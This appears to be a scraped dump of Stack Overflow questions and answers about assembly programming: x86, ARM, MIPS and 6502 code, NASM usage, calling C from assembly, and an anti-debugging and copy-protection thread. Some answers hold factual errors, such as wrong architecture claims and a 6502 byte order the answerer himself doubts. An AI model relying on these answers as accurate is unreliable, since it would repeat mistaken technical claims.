<p>Here is what happens when I use the GCC-4.7 installed by MacPorts (it uses cctools). I tried changing optimizations to see if that would help as well.</p>

<pre><code>xavierlange $&gt; /opt/local/bin/gcc-mp-4.7 -DHAVE_CONFIG_H -I. -I..  -I../libhtp  -I/usr/local/include -I/opt/local/include  -g -O0 -Wextra -Wall -fno-strict-aliasing -fno-tree-pre -Wno-unused-parameter -std=gnu99 -DOS_DARWIN -march=native   -DLIBPCAP_VERSION_MAJOR=1 -DHAVE_PCAP_SET_BUFF -DUNITTESTS -DREVISION=""61d5fe3"" -MT suricata.o -MD -MP -MF .deps/suricata.Tpo -S suricata.c -o suricata.s
xavierlange $&gt; /opt/local/bin/as suricata.s suricata.s:9811:no such instruction: `vcvtsi2ssq %rax, %xmm0,%xmm0'
suricata.s:9812:no such instruction: `vmovd %xmm0, %eax'
suricata.s:9819:no such instruction: `vcvtsi2ssq %rdx, %xmm0,%xmm0'
suricata.s:9820:no such instruction: `vaddss %xmm0, %xmm0,%xmm0'
suricata.s:9821:no such instruction: `vmovd %xmm0, %eax'
suricata.s:9824:no such instruction: `vmovd %eax, %xmm1'
suricata.s:9825:no such instruction: `vmovd %edx, %xmm2'
suricata.s:9826:no such instruction: `vdivss %xmm2, %xmm1,%xmm0'
suricata.s:9827:no such instruction: `vunpcklps %xmm0, %xmm0,%xmm0'
suricata.s:9828:no such instruction: `vcvtps2pd %xmm0, %xmm0'
suricata.s:9829:no such instruction: `vmovd %xmm0, %rax'
suricata.s:9839:no such instruction: `vmovd %rax, %xmm0'
</code></pre>
","<p>The short solution would be removing '-march=native' option (at least it worked for me).</p>
","10894096"
"Fastest way to count number of 1s in a register, ARM assembly","18937","","<p>So I had an interview question before regarding bit manipulation. The company is a well known GPU company. I had very little background in assembly language (weird despite being a phd student in computer architecture) and as this narrative would indicate, I botched it. The question was a simple:</p>

<p>""Write a fast code that will count the number of 1's in a 32-bit register.""</p>

<p>Now I am in the process of studying arm assembly. So naturally I revisited this problem again and have come up with this code just by studying the ISA. </p>

<p><strong>For you arm experts out there, is this correct? Is there a faster way to do this?</strong> Being a beginner, I naturally think this is incomplete. The AND instruction in ""xx"" feels redundant but there is no other way to shift a register in ARM isa...</p>

<p>R1 will contain the number of bits at the end while R2 is the register with bits we want to count. r6 is just a dummy register. Comments are enclosed in ()</p>

<pre><code>    MOV   R1, #0                (initialize R1 and R6 to zero)
    MOV   R6, #0        
xx: AND   R6, R6, R2, LSR #1    (Right shift by 1, right most bit is in carry flag)
    ADDCS R1, #1                (Add #1 to R1 if carry  flag is set)
    CMP R2, #0                  (update the status flags if R2 == 0 or not)
    BEQ xx                      (branch back to xx until R2==0)
</code></pre>
","<p>You could use a precomputed look up table and reduce the number of iterations to 2 or 4.</p>

<p>You could also use the logarithmic approach.</p>

<p>For more info see <a href=""http://en.wikipedia.org/wiki/Hamming_weight"">this Wikipedia article</a>.</p>
","15736688"
"How can I convert HEX to DECIMAL?","18770","","<p>I plan to convert the X variable to decimal. I'm having a hard time using turbo assembler, can you give a hand?</p>

<pre><code>code segment     ;inicio de un segmento unico
assume cs:code,ds:code,ss:code
org 100h       ;localidad de inicio del contador
main  proc     ;procedimiento principal

mov ax,cs
mov ds,ax   ; INICIO 

mov ax, x

mov ah,4ch ;comienzo del fin de programa
int 21h    ;fin del programa

main endp

x dw 0A92FH

code ends   ; fin del segmento de codigo
end main    ;fin del ensamble
</code></pre>

<p>Thanks a lot</p>
","<p>When converting numbers to a printable format it's often easiest to start with the last digit.</p>

<p>Consider converting 123 to ""123"", how would we get the last digit? It's the remained when dividing by 10 (the base). So 123 % 10 gives us 3 and 123 / 10 = 12 conveniently gives us the correct number to work with in the next iteration. On x86 the ""DIV"" instruction is nice enough to give us both the quotient and remainder (in <code>ax</code> and <code>dx</code> respectively). All that remains is to store printable characters in the string.</p>

<p>Putting all this together you end up with something like the following (using nasm syntax):</p>

<pre><code>; ConvertNumber
;   Input:
;     ax = Number to be converted
;     bx = Base
;   
;   Output:
;     si = Start of NUL-terminated buffer
;          containing the converted number
;          in ASCII represention.

ConvertNumber:
    push ax            ; Save modified registers
    push bx
    push dx
    mov si, bufferend  ; Start at the end
.convert:
    xor dx, dx         ; Clear dx for division
    div bx             ; Divide by base
    add dl, '0'        ; Convert to printable char
    cmp dl, '9'        ; Hex digit?
    jbe .store         ; No. Store it
    add dl, 'A'-'0'-10 ; Adjust hex digit
.store:
    dec si             ; Move back one position
    mov [si], dl       ; Store converted digit
    and ax, ax         ; Division result 0?
    jnz .convert       ; No. Still digits to convert
    pop dx             ; Restore modified registers
    pop bx
    pop ax
    ret
</code></pre>

<p>This requires a working buffer (16 for the case when base = 2 and an extra byte for the NUL terminator):</p>

<pre><code>buffer: times 16 db 0
bufferend:
    db 0
</code></pre>

<p>Adding support for signed numbers is left as an exercise for the reader. <a href=""https://stackoverflow.com/questions/7176506/how-do-i-write-the-value-in-rax-to-stdout-in-assembly/7176974#7176974"">Here</a> is roughly the same routine adapted for 64-bit assembly.</p>
","7865387"
"MIPS ""la"" pseudo instruciton","18732","","<p>In MIPS, the <code>la</code> instruction translates into <code>lui</code> and <code>ori</code>. However, MARS Simulator does not seem to do that at all. When I dump the following machine code:</p>

<pre><code>.text
    la $a0, array
    la $a1, array_size
    lw $a1, 0($a1)

.data
    array: .word 0:10
    array_size: .word 10
    message: .asciiz ""The sum of numbers in array is: ""
</code></pre>

<p>I get:</p>

<pre><code>00100000000001000010000000000000
00100000000001010010000000101000
10001100101001010000000000000000
</code></pre>

<p>Which is obviously. It is dumping <code>la</code> as one instruction. What does MARS do? How can I make it interpret <code>la</code> as <code>lui</code> and <code>ori</code>?</p>

<p>Thank you,</p>
","<p>What's happening here is that your assembler is compiling these <code>la</code>s as <code>addi $&lt;dest&gt;, $0, &lt;value&gt;</code>. The two-instruction sequence is only required for values which can't be represented in a 16-bit immediate; the values you're using here look like <code>0x2000</code> and <code>0x2028</code>, so they fit in a single instruction.</p>

<blockquote>
  <p>How can I make it interpret <code>la</code> as <code>lui</code> and <code>ori</code>?</p>
</blockquote>

<p>Load bigger constants. <code>:)</code> Your assembler might also have an option to force the use of the full sequence even when it's unnecessary.</p>
","8290898"
"Transfer-rate of flash drive vs hard drive","18719","","<p>There is no doubt that USB Flash drive is much faster than hard disk drive (except solid state) as a typical HDD contains moving parts. But the fact is that transmission of data from USB flash drive to system is slower than hard drive's.</p>

<p>When my system communicates with my HDD I get data-rate about 50-90+ MB/s but it in case of flash drive it is about 7-9 MB/s.</p>

<p>I also consult users and they say the same thing.</p>

<ul>
<li>Is this problem/situation caused by hardware architecture?</li>
<li>Does processor not listen to ports usually?</li>
<li>Can I write a code in assembly language to overcome this factor?</li>
</ul>
","<p>Just because it has moving parts doesnt mean it is slower, there are millions of old computer boards with sram that is far slower than a modern hard drive, not flash, RAM.</p>

<p>You are dealing with flash, writes of course are incredibly slow, even on an SSD (they use parallel tricks to overcome that just like ipods and newer thumb drives do).  Reads you are dealing with both the flash and the interface and the software.  There is logic on the usb drive side that has to deal with the usb protocol and the flash interface, etc.  A lot of layers.</p>

<p>Its real simple, buy a usb portable drive, with a laptop drive in it.  Put the laptop drive in your computer directly and get 50-90MBps or whatever, same drive on the other end of a usb interface, much slower, it is mostly the usb.  usb drives are a replacement for floppies, not a replacment or alternative to hard drives.</p>

<p>Absolutely the operating system and compiler and all of that cause performance hits, you can go faster if you remove those, but is it worth it?  its a lot of work to get a small gain, you will maybe get 5-15% or so but still not approach the speed without the usb there.</p>

<p>Anyone know what compact flash read speed ratings are?  I would assume much faster than usb flash. If you have a true ide interface connected to compact flash (and not through USB), then I would expect to be able to get into the discussion of spinning mechanical media vs solid state.  You would need an ide drive with no caches on it to get a more fair comparision btw.</p>

<p>Flash is slow, usb is slow, think of these technologies as floppy disks not ram.  I know not everyone here has a lot of experience with floppy disks...</p>
","8232529"
"Compiling 32 bit Assembler on 64 bit ubuntu","18707","","<p>I have program written in 32 bit assembly language... Now I just can't compile it on 64 bit OS. On our school they are specific and program has to be written in 32 bit version. Here is my program:</p>

<pre><code>bits 32
extern _printf
global _start

section .data
    message db ""Hello world!!"", 10, 0

section .text

_start:
    pushad 
    push dword message
    call _printf 
    add esp, 4 
    popad 
    ret
</code></pre>

<p>Any idea? I have tried so many ways to compile that.
Error output after compiling:</p>

<pre><code>nasm -f elf64 vaja4.asm
ld vaja4.o -o vaja4
./vaja4
</code></pre>

<p>output:</p>

<pre><code>vaja4.o: In function `_start':
vaja4.asm:(.text+0x7): undefined reference to `_printf'
</code></pre>
","<p>First change <code>_printf</code> to <code>printf</code> and the <code>_start</code> symbol to <code>main</code>, then use <code>gcc</code> to link the object file, which will automatically link it to <code>libc</code>, <em>you need to do that because AFAIK you can't link to libc without a <code>main</code></em>. Also you should use elf32 not elf64 when assembling because the code has 32 bits instructions :</p>

<pre><code>bits 32
extern printf
global main

section .data
    message db ""Hello world!!"", 10, 0

section .text

main:
    pushad 
    push dword message
    call printf 
    add esp, 4 
    popad 
    ret
</code></pre>

<p>And build with:</p>

<pre><code>nasm -f elf32 vaja4.asm
gcc -m32 vaja4.o -o vaja4
$./test 
$Hello world!!
</code></pre>

<p>There's a nice tutorial here:</p>

<p><a href=""http://jdefr.swippet.com/2012/03/22/using-libc-with-assembly/"">http://jdefr.swippet.com/2012/03/22/using-libc-with-assembly/</a></p>

<p><strong>Edit:</strong></p>

<p>Since you're now compiling 32-bit code on a 64-bit system, you will need to install the 32-bit version of the libraries</p>

<pre><code>apt-get install ia32-libs 
</code></pre>
","13179154"
"Assigning value to variable in x86 (NASM)","18704","","<p>I have decided to learn assembler for fun. I have been coding in C for many years.</p>

<p>I followed some online tutorials that print ""Hello world"" and dug around a bit in the NASM manual. All well and good. So, I set myself a task of printing ""hello world"" in a loop. I know I can do this with the <code>loop</code> opcode, but wanted to code it explicitly and use variables defined in the <code>.bss</code> section.</p>

<p>However, I obviously misunderstand how variable assignment works in assembly as I get the error message:</p>

<pre><code>nasm -felf -o hello.o hello.asm
hello.asm:16: error: invalid combination of opcode and operands
hello.asm:17: error: invalid combination of opcode and operands
hello.asm:28: error: invalid combination of opcode and operands
</code></pre>

<p>I have tried searching the web for info on variable assignment, including the NASM manual, but can't seem to find the information I need. Can anyone assist? Here's my (simple!) code:</p>

<pre><code>; print ""Hello world!"" to the screen multiple times

section .data
    msg:    db  'Hello world!', 10
    msglen: equ $ - msg

section .bss
    iter:   resb    1

section .text
    global _start

_start:

    ; loop 10 times
    mov iter, 0     ; initalise loop counter
FL: cmp iter, 10    ; is iter == 10?
    jge LoopEnd

    ; write the message to STDOUT:
    mov eax,4       ; code for write syscall
    mov ebx,1       ; stdout fd
    mov ecx,msg     ; message to print...
    mov edx,msglen  ; ...and it's length
    int 80h         ; kernel interrupt

    ; increment loop iterator
    inc iter
    jp FL

LoopEnd:


    ; now exit, with return code 0:
    mov eax,1
    mov ebx,0
    int 80h
</code></pre>
","<p>To make a memory reference in nasm, you must surround the address with square brackets. Additionally, in each of the cases you've got here, you also need to specify a size, like so:</p>

<pre><code>    mov byte [iter], 0     ; initalise loop counter
FL: cmp byte [iter], 10    ; is iter == 10?

    inc byte [iter]
</code></pre>

<p>In this case, though, it would probably make more sense to store <code>iter</code> in a register instead of in memory. You're clobbering most of the obvious ones with your system calls, but <code>esi</code> or <code>edi</code> look available.</p>
","12943636"
"What is the fastest way to convert float to int on x86","18631","","<p>What is the fastest way you know to convert a floating-point number to an int on an x86 CPU.  Preferrably in C or assembly (that can be in-lined in C) for any combination of the following:</p>

<ul>
<li>32/64/80-bit float -> 32/64-bit integer</li>
</ul>

<p>I'm looking for some technique that is faster than to just let the compiler do it.</p>
","<p>It depends on if you want a truncating conversion or a rounding one and at what precision. By default, C will perform a truncating conversion when you go from float to int. There are FPU instructions that do it but it's not an ANSI C conversion and there are significant caveats to using it (such as knowing the FPU rounding state). Since the answer to your problem is quite complex and depends on some variables you haven't expressed, I recommend this article on the issue:</p>

<p><a href=""http://www.stereopsis.com/FPU.html"" rel=""noreferrer"">http://www.stereopsis.com/FPU.html</a></p>
","78681"
"Adding 2 two-digit numbers that results to a 3-digit in assembly","18629","","<p>I managed to make the addition of two-digit numbers based on the solutions provided by helpful people from the thread I created last time:</p>

<p><a href=""https://stackoverflow.com/questions/11562895/how-do-i-use-the-adc-in-assembly"">How do I use ADC in assembly?</a></p>

<p>So now, there seems to be a problem when I add 2 numbers and their result will be a 3-digit number. The jump named IS_3DIGIT handles that possibility, but addition of some numbers like 80 + 80, 99 + 99, 89 + 82 all give wrong results. 56 + 77 works well. So my hypothesis is that adding two numbers higher than 79 will give wrong results. How can I resolve this problem? BTW, additions like 99 + 23 or 89 + 43 give correct results.</p>

<pre><code>.MODEL SMALL
.STACK 1000
.DATA

MSGA DB 13,10,""Input first number: "",""$""
MSGB DB 13,10,""Input second number:"",""$""
MSGC DB 13,10,""The sum is: "",""$""

NUM1 db ?
NUM2 db ?
NUM3 db ?

.CODE

MAIN PROC NEAR

MOV AX, @DATA
MOV DS, AX

; get first number
LEA DX, MSGA
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV BL, AL

MOV AH, 01
INT 21H
SUB AL, '0'

MOV CL, AL

; get second number
LEA DX, MSGB
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV DL, AL

MOV AH, 01
INT 21H
SUB AL, '0'

MOV DH, AL

; add
MOV AL, CL
MOV AH, BL
ADD AL, DH
AAA 
ADD AH, DL

MOV NUM1, AL
ADD NUM1, '0'

; if tens digit is less than or equal to 9
CMP AH, 9
JLE NOT_3DIGIT 

IS_3DIGIT:
MOV AL, AH   ; move value of ah to al
SUB AH, AH   ; clear ah
ADD AL, 0    ; al + 0 = al (tens digit)
AAA          ; move for addition
ADD AH, 0    ; ah + 0 + 1 = ah + 1 (hundreds digit)
MOV NUM2, AL
MOV NUM3, AH
ADD NUM2, '0'
ADD NUM3, '0'
; output sum
LEA DX, MSGC
MOV AH, 09h
INT 21h
MOV DL, NUM3
MOV AH, 02H
INT 21h
MOV DL, NUM2
MOV AH, 02H
INT 21h
JMP PRINT_LASTDIGIT


NOT_3DIGIT:    
MOV NUM2, AH
ADD NUM2, '0'
; output sum
LEA DX, MSGC
MOV AH, 09h
INT 21h
MOV DL, NUM2
MOV AH, 02H
INT 21h

PRINT_LASTDIGIT:
MOV DL, NUM1
MOV AH, 02H
INT 21h

EXIT:
MOV AH, 4Ch
INT 21h

MAIN ENDP
END MAIN
</code></pre>
","<p>Well you did it the ""hard way"", really. Again, <code>aaa</code> can do all the hard work, as long as the right things are in <code>ah</code> and <code>al</code>, so different cases for overflow and no overflow aren't really necessary.</p>

<p>Something like this (untested):</p>

<pre><code>; ah:al = tens:ones
add al,dh
aaa
; now make ah:al hundres:tens
mov bl,al
mov al,ah
xor ah,ah   ; this will be the hundreds digit
add al,dl
aaa
; result in ah:al:bl
</code></pre>

<p>I took the use of <code>dh</code> and <code>dl</code> from your source, and <code>bl</code> is just some extra place. They're not important, but the things in <code>ah</code> and <code>al</code> really have to be there, just as last time.</p>

<p>I've read the descriptions of <code>aaa</code> and <code>add</code> very closely, and I <em>think</em> that should work even though the second add can be adding 10 to something, but I'm only about 90% sure about that.</p>
","11576737"
"Assembly language - More than one type?","18622","","<p>I start university in a few weeks (software engineering degree) and know that one of the modules I'll be studying in the first year is 'fundamentals of architecture' or something similar; basically it's learning to program in 'assembly'.</p>

<p>I'm wanting to do some background learning so I'm prepared for it (I've done the same on some other units), but don't know if there is more than one 'assembly language'. How many are there? Is it one per manufacturer, a 32-bit and 64-bit language, or just one standard?</p>

<p>If there is more than one type, what is the most 'popular' or likely to be taught at university level?</p>
","<p>There are many, many types of assembly languages.  The current most popular are ARM, MIPS, and x86.  ARM is used on lots of cell phones and many embedded systems.  MIPS is popular on IBM CPUs and is found on systems such as Macs, some video game consoles, and a few I'm sure I'm missing.  x86 assembler is used on Intel PCs.  Each flavor has different versions which span the gammut from 16-bit to 64-bit opcodes.  The thing about assembly is old architectures tend to die and new ones come along, but the fundamental things that RISC style systems do are mostly the same.  It's just a matter of learning the mnemonics between systems.  Move, Mov, Load, etc.  all load a register with a value.  It's like any other language really.  Once you learn one, it's pretty easy to pick up newer ones.  Some older ones you might run into are Z80, 68000, 6502, and 6510 - depending on how far back in the way back machine you want to go.</p>

<p>Hope that helps.</p>
","3527083"
"imul assembly instruction - one operand?","18482","","<p>I am using a run-time debugger.</p>

<p>EAX: 0000 0023
EDX: 5555 5556</p>

<pre><code>imul edx
</code></pre>

<p>EAX: aaaa aac2
EDX: 0000 000b</p>

<p>I am utterly confused, and can't figure out how this multiply is working.  What's happening here? I notice in a similar <a href=""https://stackoverflow.com/questions/1948058/problem-in-understanding-mul-imul-instructions-of-assembly-language"">question here</a> that  <code>imul ebx ; result in EDX:EAX</code> I don't understand the EDX:EAX notation though :/</p>
","<p>When <code>imul</code> is passed a 32 bit argument as in your case with <code>EDX</code> which effectively means <code>EAX * EDX</code> where both EAX and EDX are 32 bit registers. </p>

<p>Since you are multiplying two 32 bit values it is possible that the answer will overflow 32 bits in which case the high 32 bits of the answer will be written to the EDX register and the low 32 bits to the EAX register, this is represented with the `EDX:EAX' notation.</p>
","3818782"
"What is your favourite anti-debugging trick?","18445","","<p>At my previous employer we used a third party component which basically was just a DLL and a header file. That particular module handled printing in Win32. However, the company that made the component went bankcrupt so I couldn't report a bug I'd found.</p>

<p>So I decided to fix the bug myself and launched the debugger. I was surprised to find anti-debugging code almost everywhere, the usual <code>IsDebuggerPresent</code>, but the thing that caught my attention was this:</p>

<pre><code>    ; some twiddling with xor 
    ; and data, result in eax 
    jmp eax 
    mov eax, 0x310fac09 
    ; rest of code here 
</code></pre>

<p>At the first glance I just stepped over the routine which was called twice, then things just went bananas. After a while I realized that the bit twiddling result was always the same, i.e. the jmp eax always jumped right into the <code>mov eax, 0x310fac09</code> instruction.
I dissected the bytes and there it was, <code>0f31</code>, the <code>rdtsc</code> instruction which was used to measure the time spent between some calls in the DLL. </p>

<p>So my question to SO is: <strong>What is your favourite anti-debugging trick?</strong> </p>
","<p>My favorite trick is to write a simple instruction emulator for an obscure microprocessor. </p>

<p>The copy protection and some of the core functionality will then compiled for the microprocessor (GCC is a great help here) and linked into the program as a binary blob.</p>

<p>The idea behind this is, that the copy protection does not exist in ordinary x86 code and as such cannot be disassembled. You cannot remove the entire emulator either because this would remove core functionality from the program.</p>

<p>The only chance to hack the program is to reverse engineer what the microprocessor emulator does.</p>

<p>I've used MIPS32 for emulation because it was so easy to emulate (it took just 500 lines of simple C-code). To make things even more obscure I didn't used the raw MIPS32 opcodes. Instead each opcode was xor'ed with it's own address.</p>

<p>The binary of the copy protection looked like garbage-data.</p>

<p>Highly recommended! It took more than 6 month before a crack came out (it was for a game-project).</p>
","573187"
"Assembly: MOVing between two memory addresses","18403","","<p>I'm trying to learn assermbly (so bear with me) and I'm getting a compile error on this line:</p>

<pre><code>mov byte [t_last], [t_cur]
</code></pre>

<p>The error is</p>

<pre><code>error: invalid combination of opcode and operands
</code></pre>

<p>I suspect that the cause of this error is simply that its not possible for a mov instruction to move between two memory addresses, but half an hour of googling and I haven't been able to confirm this - is this the case?</p>

<p>Also, assuming I'm right that means I need to use a register as an intermediate point for copying memory:</p>

<pre><code>mov cl, [t_cur]
mov [t_last], cl
</code></pre>

<p>Whats the recommended register to use (or should I use the stack instead)?</p>
","<p>Your suspicion is correct, you can't move from memory to memory.</p>

<p>Any general-purpose register will do. Remember to PUSH the register if you are not sure what's inside it and to restore it back once done.</p>
","1299094"
"NEG in Assembly","18354","","<pre><code>neg 3BH
</code></pre>

<p>As I understand, I should get <code>C5</code>, but I got <code>C4</code> (I switch each 1 to 0 and each 0 to 1). What's the problem?</p>
","<p><em>neg</em> computes the two's complement negative value, not the bitwise negative. You'll want a <em>not</em> instruction, or manually add one to the answer to get your desired result.</p>
","8673151"
"How do I translate assembly to binary?","18339","","<p>For example: </p>

<pre><code>        .text
        .align 2
        .global main
        .equ val,0x4712         # 16-bit binary code for 0x4712: 0100 0111 0001 0010
                                # Program code starts now
main:                           # This label must be main:, not MAIN: 
        movi r16,val            # WHAT WOULD THIS LINE BE IN BINARY?
        movi r17,0
loop:   addi r17,r17,1
        subi r16,r16,1 
        bne  r16,r0,loop
stop:   br   stop
.end 
</code></pre>
","<p>You mean, by hand?</p>

<p>By hand, you grab the instruction set sheet for your microprocessor, understand your addressing modes, and other data representation issues, and then convert that to something convenient, like a hexadecimal notation.</p>

<p>Then you would need to get that information in to the devices memory, using some device specific process (file from disk, file from serial line, keyed in from a front panel with a bunch a switches).</p>

<p>Obviously, there can be all sorts of tool chain issues that you'll need to figure out to get your binary into a machine. If you're just doing it for laughs, hexadecimal, a pencil, and a legal pad have suited many for years.</p>

<p>Edit --</p>

<p>You have to know several things.</p>

<p>First, the op codes, and along with the op codes, you need to know the addressing modes.</p>

<p>Consider this 6502:</p>

<pre><code>LDA #$00
LDA $00
LDA $1234
</code></pre>

<p>Those are three different instructions on the 6502.</p>

<p>The first loads the Accumulator (A) with $00, 0 in hex. The # symbol tells the assembler that you're using the ""immediate"" addressing mode (the 6502 has 13 total addressing modes).</p>

<p>The second load the Accumulator with the value of the memory location located at address $0000. On the 6502, it has a ""zero page"" mode, so it can more easily access memory from the first page of memory (addresses $0000-$00FF).</p>

<p>The third loads the Accumulator with the value of the memory location located at address $1234. This is absolute addressing, simply specifying the actual address of the memory you are interested in.</p>

<p>I highlight this example because, at a glance, all three of these look the same. But in truth, they all compile to 3 distinct instructions, or opcodes. So, it's important to understand what your assembly is telling you so that you can select the correct opcode for your processor.</p>

<p>Now, if you look at a <a href=""http://www.atarimax.com/jindroush.atari.org/aopc.html"" rel=""noreferrer"">opcode guide</a> for the 6502, and look up the LDA instruction, you'll see the different, binary values for each instruction.</p>

<p>So, in this case you would get:</p>

<pre><code>$A9 $00
$A5 $00
$AD $12 $34
</code></pre>

<p>That's the binary (in hex) representation of those 3 instructions.</p>

<p>The first, $A9, is for the ""immediate"" addressing mode, the second, $A5, for Zero Page addressing, and finally $AD for Absolute.</p>

<p>Also note that following the operands, are the arguments. For the 6502, they just follow in the byte stream. Different processors do different things. Note, that for the Absolute, we have 2 bytes, $12 and $34, each representing half of the total, 16 bit address. I believe this is correct, that the Most Significant Byte of the address comes first, but it might be reversed ($A9 $34 $12).</p>

<p>So, that's the fundamental of assembling by hand.</p>

<p>Other things to note are issues like what location the assembly will be loaded at. That will affect values for things like your labels.</p>

<p>In 6502:</p>

<pre><code>label:  LDA #$00
        JMP label
</code></pre>

<p>If your assembly is starting at the address $1000, this this will assemble to:</p>

<pre><code>$A9 $00
$4C $10 $00
</code></pre>

<p>If your assembly is starting at address $5555 then:</p>

<pre><code>$A9 $00
$4C $55 $55
</code></pre>

<p>See, the JMP (Jump) instruction ($4C) needs an address to jump to, and the label in your assembly is relative to its location in the program. Conveniently, in this case, the label is at the very beginning. But you can see how the address is coded in to the final machine code.</p>

<p>6502 is EASY (really easy) assembly. Modern processors, well, aren't. The modern assemblers do a lot of work for you, and you have more complicated CPUs with larger instruction sets, and things like alignment issues -- these are all missing from the 6502. But as a hand assembler, you're responsible for all of those nuances.</p>

<p>Your microprocessor manual is supposed to tell you these nuances. But with the modern complicated CPUs, its likely non-trivial to do and learn.</p>

<p>Don't necessarily want to deter you from this, but be aware, it may well be a lot of work.</p>

<p>But this is the essence of what you need to do.</p>
","3826722"
"How To Use Scanf In NASM?","18292","","<p>I can't figure this out. I'm obviously <em>really</em> new to Assembly, and I'm trying to figure out how to use Scanf to get user input. </p>

<p>I know to use Printf all I have to do is push the data I want to write on the screen into the stack like this:</p>

<pre><code>global _main
extern _printf
extern _scanf

section .data
msg db ""Hi"", 0

section .text
_main:
  push ebp
  mov ebp, esp  

  push msg
  call _printf

  mov esp, ebp
  pop ebp
ret
</code></pre>

<p>But I can't figure out how to use Scanf. Can someone please just give me the simplest possible source code you can for Scanf? I really just want to put what the user types in.</p>

<p>I'm not used to 32bit Assembly. I've only ever used 16bit, and I know in 16bit (DOS) you can just do this:</p>

<pre><code>mov ah, 3fh
mov dx, input
int 21h

input rb 100d
</code></pre>

<p>And whatever you type in will the placed at the address of ""input.""</p>

<p>Please bear with me. I'm trying to figure this out. </p>
","<p>I found this <a href=""http://issc.uj.ac.za/assembler/NASM.pdf"" rel=""nofollow noreferrer"">'Programming in NASM.PDF'</a> </p>

<pre><code>; add1.asm
SECTION .data
    message1: db ""Enter the first number: "", 0
    message2: db ""Enter the second number: "", 0
    formatin: db ""%d"", 0
    formatout: db ""%d"", 10, 0 ; newline, nul terminator
    integer1: times 4 db 0 ; 32-bits integer = 4 bytes
    integer2: times 4 db 0 ;
SECTION .text
   global _main 
   extern _scanf 
   extern _printf     

_main:

   push ebx ; save registers
   push ecx
   push message1
   call printf

   add esp, 4 ; remove parameters
   push integer1 ; address of integer1 (second parameter)
   push formatin ; arguments are right to left (first parameter)
   call scanf

   add esp, 8 ; remove parameters
   push message2
   call printf

   add esp, 4 ; remove parameters
   push integer2 ; address of integer2
   push formatin ; arguments are right to left
   call scanf

   add esp, 8 ; remove parameters

   mov ebx, dword [integer1]
   mov ecx, dword [integer2]
   add ebx, ecx ; add the values          ; the addition
   push ebx
   push formatout
   call printf                            ; call printf to display the sum
   add esp, 8                             ; remove parameters
   pop ecx
   pop ebx ; restore registers in reverse order
   mov eax, 0 ; no error
   ret
</code></pre>

<p>Which is the asm version of this C function:</p>

<pre><code>#include &lt;stdio.h&gt;
int main(int argc, char *argv[])
{
    int integer1, integer2;
    printf(""Enter the first number: "");
    scanf(""%d"", &amp;integer1);
    printf(""Enter the second number: "");
    scanf(""%d"", &amp;integer2);
    printf(""%d\n"", integer1+integer2);
    return 0;
}
</code></pre>
","10973783"
"Calling C functions from x86 assembly language","18221","","<p>Is it possible to generate assembly language functions from C functions using GCC, so that they can be invoked from an assembly language program? I know that gcc compiles C to machine code (which can easily be disassembled into assembly language), and I already know that it's possible to <a href=""https://stackoverflow.com/questions/5131568/using-inline-assembly-in-c-c"">inline assembly language functions in C</a>, but I haven't yet found a way to invoke C functions from assembly language programs, which is basically the inverse of this.</p>

<p>Here, I'm attempting to inline a C function in an x86 assembly program. If inlining isn't possible, then is there some other way to invoke a C function from an assembly language program?</p>

<pre><code>.686p
.model flat,stdcall
.stack 2048

.data

.code
start:

invoke  ExitProcess, 0

printSomething PROC ;now I'm attempting to inline a C function here
    void printSomething(thingToPrint){
        printf(""This is a C function that I want to invoke from an assembly language program."");
        printf(""There must be some way to do this - is it possible somehow?"");
    }
printSomething ENDP

end start
</code></pre>
","<p>I'm going from memory here, so I may be off slightly on a detail or two.  However, it should I  hope be enough to get you going in the right direction.</p>

<p>You're going to need to tell the GCC assembler that your routine <strong>printSomething()</strong> is not defined in your assembly file.  In 'C' you would use the <strong>extern</strong> keyword.  For assembly you  will need to use <strong>.globl</strong>.</p>

<pre><code>.globl printSomething
</code></pre>

<p>If you are using a different assembler than GCC's, the keyword may be different.</p>

<p>The next big question is 'how do I pass the arguments'?  This very much depends upon your processor AND OS.  Since the title of your question indicates x86, I am going to assume that you are using either the 16-bit or 32-bit modes and the standard x86 ABI (as opposed to x86-64 which is also differs between Windows and Linux).  The C parameters are passed to the called routine by pushing them onto the stack.  They are pushed onto the stack from right to left.</p>

<p>Thus,</p>

<pre><code>printSomething (arg1, arg2, arg3, arg4);
</code></pre>

<p>translates to ...</p>

<pre><code>pushl arg4
pushl arg3
pushl arg2
pushl arg1
call  printSomething
addl  $0x10, %esp
</code></pre>

<p>You may be asking yourself, what is this </p>

<pre><code>addl $0x10, %esp
</code></pre>

<p>?  We passed (aka pushed) four 32-bit arguments to the routine (onto the stack).  Although the routine knows to expect those arguments, it is NOT responsible for popping them off the stack.  The caller is responsible for that.  So, after we return from the routine, we adjust the stack pointer to discard the four 32-bit arguments we previously pushed onto the stack.</p>

<p>In the above example, I am assuming that we are operating in 32-bit mode.  If it were 16-bit mode, it would be ...</p>

<pre><code>pushw arg4
pushw arg3
pushw arg2
pushw arg1
call  printSomething
addw  $0x8, %sp
</code></pre>

<p>I realize that in your example, <strong>printSomething()</strong> only takes one (1) argument and in my example I used four (4).  Just adjust my example as is needed.</p>

<p>For the final steps, you will need to compile both your C and assembly files into object files, link the object files and then execute.</p>

<p>I hope this helps.</p>
","16263460"
"How does assembly do parameter passing: by value, reference, pointer for different types/arrays?","18179","","<p>In attempt to look at this, I wrote this simple code where I just created variables of different types and passed them into a function by value, by reference, and by pointer: </p>

<pre><code>int i = 1;
char c = 'a';
int* p = &amp;i;
float f = 1.1;
TestClass tc; // has 2 private data members: int i = 1 and int j = 2
</code></pre>

<p>the function bodies were left blank because i am just looking at how parameters are passed in.</p>

<pre><code>passByValue(i, c, p, f, tc); 
passByReference(i, c, p, f, tc); 
passByPointer(&amp;i, &amp;c, &amp;p, &amp;f, &amp;tc);
</code></pre>

<p>wanted to see how this is different for an array and also how the parameters are then accessed.</p>

<pre><code>int numbers[] = {1, 2, 3};
passArray(numbers); 
</code></pre>

<p>assembly: </p>

<pre><code>passByValue(i, c, p, f, tc)

mov EAX, DWORD PTR [EBP - 16]
    mov DL, BYTE PTR [EBP - 17]
    mov ECX, DWORD PTR [EBP - 24]
    movss   XMM0, DWORD PTR [EBP - 28]
    mov ESI, DWORD PTR [EBP - 40]
    mov DWORD PTR [EBP - 48], ESI
    mov ESI, DWORD PTR [EBP - 36]
    mov DWORD PTR [EBP - 44], ESI
    lea ESI, DWORD PTR [EBP - 48]
    mov DWORD PTR [ESP], EAX
    movsx   EAX, DL
    mov DWORD PTR [ESP + 4], EAX
    mov DWORD PTR [ESP + 8], ECX
